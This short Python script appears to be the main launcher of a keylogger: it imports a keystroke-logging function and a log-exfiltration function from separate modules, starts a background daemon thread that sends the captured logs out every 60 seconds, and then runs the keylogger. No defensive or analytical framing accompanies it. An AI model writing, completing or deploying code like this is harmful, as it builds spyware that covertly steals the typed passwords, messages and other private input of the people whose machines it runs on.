from keylogger import start_keylogger
from exfil import exfiltrate_logs
import threading
import time

def exfil_loop():
    while True:
        exfiltrate_logs()
        time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=exfil_loop, daemon=True).start()
    start_keylogger()
